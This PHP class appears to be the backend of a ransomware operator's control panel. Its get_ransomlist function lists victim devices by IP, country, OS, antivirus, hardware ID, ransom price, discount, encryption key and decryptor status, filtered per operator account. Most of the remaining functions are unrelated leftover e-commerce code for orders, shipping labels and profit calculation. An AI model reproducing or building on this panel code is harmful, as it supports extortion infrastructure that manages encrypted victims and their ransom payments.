<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 11/2/14
 * Time: 1:24 PM
 */

class RansomlistHandler {
    public $data;
    public $userdata;

    function __construct($data=array(),$userdata=array()){
        $this->data = $data;
        $this->userdata = $userdata;
    }

    /**
     * Output
     * @param $str
     */
    public function output($str){
        print_r(json_encode(
            array(
                'response' => $str
            )
        ));
    }

    /**
     * Remove special characters
     * @param $string
     * @return mixed
     */
    function clean($string) {
        $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.
        return preg_replace('/[^A-Za-z0-9\-]/', '', $string); // Removes special chars.
    }

    /**
     * Get all lang data
     * @return mixed
     */
    public function get_lang_data(){
        $CI =   & get_instance();
        $lang = $CI->lang_model->get_textdata();
        return $lang;
    }

    /**
     * Get job list tc
     */
    public function get_ransomlist(){
        $CI =   & get_instance();

        // Select 1 from table_name will return false if the table does not exist.
        $table_name = "device_tb";
        //Set primary key field
        $primaryKey = 'id';
        //print_r($this->userdata->member_key);
        //Columns define
        $columns = array(
            array( 'db' => 'country',      'dt' => 'country'),
            array( 'db' => 'ipaddress',      'dt' => 'ipaddress' ),
            array( 'db' => 'crc32',      'dt' => 'crc32' )
           , array( 'db' => 'price',      'dt' => 'price' )
           , array( 'db' => 'createdAt',      'dt' =>'createdAt' )
           , array( 'db' => 'os',      'dt' => 'os' )
           , array( 'db' => 'av',      'dt' => 'av' )
           , array( 'db' => 'decryptedfile',      'dt' => 'decryptedfile' )
           , array( 'db' => 'hdd',      'dt' => 'hdd' )
           , array( 'db' => 'status',      'dt' => 'status' )
           , array( 'db' => 'decryptor',      'dt' => 'decryptor' )
           , array( 'db' => 'enckey',      'dt' => 'enckey' )
           , array( 'db' => 'hwid',      'dt' => 'hwid' )
           , array( 'db' => 'discount',      'dt' => 'discount' )
           , array( 'db' => 'unread_msg',      'dt' => 'unread_msg' )
        );

        // SQL server connection information
        $sql_details = array(
            'user' => $CI->db->username,
            'pass' =>  $CI->db->password,
            'db'   =>  $CI->db->database,
            'host' =>  $CI->db->hostname,
        );

        //filter column define

        $filter_columns = array(
            'owner' => $this->userdata->member_key
        );

        if(isset($_GET['unread_msg']) && $_GET['unread_msg'] === '1'){
        	$filter_columns['unread_msg'] = 1;
        }
        //$filter_columns = array();
       
        $result = SSP::filter_column( $_GET, $sql_details, $table_name, $primaryKey, $columns, $filter_columns );

        //Count remain days from expire_date
        //print_r($result);
        /*$new_data = array();
        foreach($result['data'] as $item){
            $param = $item[1];
            $tmp = json_decode($param);

            $filter = $this->get_filter_string($tmp);
            $action = $this->get_job_string($item[0]);
            $new_data[] = array($action,$filter,$item[2],$item[3],$item[4]);
        }
        $result['data'] = $new_data;
        */
        echo json_encode($result);
    }

    public function get_file_upload_history_tb(){
        $CI =   & get_instance();

        // Select 1 from table_name will return false if the table does not exist.
        $table_name = $this->userdata['id']."_history";
        //Set primary key field
        $primaryKey = 'id';
        //Columns define
        $columns = array(
            array( 'db' => 'registered_time',     'dt' => 0 ),
            array( 'db' => 'param1',      'dt' => 2 ),      //filename
            array( 'db' => 'comment',      'dt' => 3 )
        );

        // SQL server connection information
        $sql_details = array(
            'user' => $CI->db->username,
            'pass' =>  $CI->db->password,
            'db'   =>  $CI->db->database,
            'host' =>  $CI->db->hostname,
        );

        //filter column define
        $filter_columns = array();

        echo json_encode(
            SSP::filter_column( $_GET, $sql_details, $table_name, $primaryKey, $columns, $filter_columns )
        );
    }

    public function get_job_string($action=''){
        $lang   =   $this->get_lang_data();
        $actions = array(
            'update_info' =>$lang['action_job_update_info'],
            'update_price' =>$lang['action_job_update_price'],
            'remove' =>$lang['action_job_remove'],
            'move_to_import_ban' =>$lang['action_job_move_to_import_ban'],
            'move_to_export_ban' => $lang['action_job_move_to_export_ban'],
            'release_from_import_ban' => $lang['action_job_release_from_import_ban'],
            'release_from_export_ban' => $lang['action_job_release_from_export_ban'],
            'bulk_list' => $lang['action_job_bulk_list'],
            'bulk_remove' =>$lang['action_job_bulk_remove'],
            'update_info_individual' =>$lang['action_job_update_info_individual'],
            'individual_list' =>$lang['action_job_individual_list'],
            'individual_revise' =>$lang['action_job_individual_revise'],
            'individual_list_stop' => $lang['action_job_individual_list_stop'],
            'individual_remove' =>$lang['action_job_individual_remove'],
            'bulk_date_update' => $lang['action_job_bulk_date_update'],
            'bulk_active_stop' => $lang['action_job_bulk_active_stop'],
            'auto_revise' =>$lang['action_job_auto_revise'],
            'bulk_relist' => $lang['action_job_bulk_relist'],
            'individual_order_profit_calculate' =>$lang['action_job_individual_order_profit_calculate'],

            'orders_new_calculate_profit' =>$lang['action_job_calculate_profit'],
            'orders_new_order_excel_output' =>$lang['action_job_excel_output'],

            'orders_input_calculate_profit' =>$lang['action_job_calculate_profit'],
            'orders_input_order_excel_output' =>$lang['action_job_excel_output'],

            'orders_shipping_calculate_profit' =>$lang['action_job_calculate_profit'],
            'orders_shipping_order_excel_output' =>$lang['action_job_excel_output'],

            'orders_complete_calculate_profit' =>$lang['action_job_calculate_profit'],
            'orders_complete_order_excel_output' =>$lang['action_job_excel_output'],
            'individual_package_output' =>$lang['action_individual_package_output'],
            'individual_label_output' =>$lang['action_individual_label_output'],

            'orders_shipping_recive_label_output' =>$lang['action_job_recive_label_output'],
            'orders_shipping_package_label_output' =>$lang['action_job_package_label_output'],
            'orders_shipping_post_output' =>$lang['action_job_post_output'],
            'orders_shipping_ems_output' =>$lang['action_job_ems_output'],
            'orders_shipping_sal_track_output' =>$lang['action_job_sal_track_output'],
            'orders_shipping_complete_price_table_output' =>$lang['action_job_complete_price_table_output']

        );
        $res = $action;
        foreach($actions as $key => $action_name){
            if($key == $action){
                $res = $action_name;
                break;
            }
        }
        return $res;
    }

    public function get_filter_string($filter=''){
        $lang   =   $this->get_lang_data();
        $filters = array(
            'all' => $lang['filter_all'],
            'research_all' => $lang['filter_research_all'],
            'inventory_all' => $lang['filter_inventory_all'],
            'orders_new_all' => $lang['filter_orders_new_all'],
            'orders_input_all' => $lang['filter_orders_input_all'],
            'orders_shipping_all' => $lang['filter_orders_shipping_all'],
            'orders_complete_all' => $lang['filter_orders_complete_all'],
            'is_new' =>$lang['filter_is_new'],
            'is_used' =>$lang['filter_is_used'],
            'profit_plus' =>$lang['filter_profit_plus'],
            'profit_minus' =>$lang['filter_profit_minus'],
            'export_ban' => $lang['filter_export_ban'],
            'is_adult' => $lang['filter_is_adult'],
            'is_listed' =>$lang['filter_is_listed'],
            'is_none_listed' =>$lang['filter_is_none_listed'],
            'is_ship_ems' =>$lang['filter_is_ship_ems'],
            'individual' => $lang['filter_individual'],
            'calculate' =>$lang['filter_calculate'],
            'is_stop' => $lang['filter_is_stop'],
            'list' => $lang['filter_list'],
            'revise' =>$lang['filter_revise'],
            'bulk_auto_revise' =>$lang['filter_bulk_auto_revise'],
            'is_none_price' =>$lang['filter_is_none_price'],
            'us_unregistered' => $lang['filter_us_unregistered'],
            'us_unregistered_listed' =>$lang['filter_us_unregistered_listed'],
            'preorder' =>$lang['filter_preorder'],
            'order_profit_calculate' =>$lang['filter_order_profit_calculate'],

            'purchase_complete' =>$lang['filter_purchase_complete'],
            'purchase_incomplete' =>$lang['filter_purchase_incomplete'],
            'input_complete' =>$lang['filter_input_complete'],
            'input_incomplete' =>$lang['filter_input_incomplete'],
            'shipping_complete' =>$lang['filter_shipping_complete'],
            'shipping_incomplete' =>$lang['filter_shipping_incomplete'],
            'order_complete' =>$lang['filter_order_complete'],
            'order_incomplete' =>$lang['filter_order_incomplete'],

            'individual_package_output' =>$lang['filter_individual_package_output'],
            'individual_label_output' =>$lang['filter_individual_label_output'],
            'orders_ems_all' =>$lang['filter_ems_orders'],
            'orders_sal_all' =>$lang['filter_sal_orders'],
            'orders_sal_track_all' =>$lang['filter_sal_track_orders'],
            'orders_sal_air_all' =>$lang['filter_sal_air_orders'],
            'filter_confirm_shipment' =>'Confirm shipment'
        );
        $res = $filter;
        $remain_info = '';
        foreach($filters as $key => $filter_name){
            if($key == $filter->type){
                $res = $filter_name;
                if($key == "list" || $key == "calculate" || $key == "revise"  ){
                    if(!is_object($filter->value)){
                        $remain_info = "(".$filter->value.")";
                    }else{
                        $remain_info = "(".$filter->value->asin.",".$filter->value->condition.")";
                    }
                    $res .= $remain_info;
                }
                if($key== 'order_profit_calculate'  || $key== 'individual_package_output' || $key== 'individual_label_output'|| $key=='filter_confirm_shipment')
                {
                    if(!is_object($filter->value)){
                        $remain_info = "(".$filter->value.")";
                    }else{
                        $remain_info = "(".$filter->value->order_id.")";
                    }
                    $res .= $remain_info;
                }
                break;
            }

        }

        return $res;
    }
}
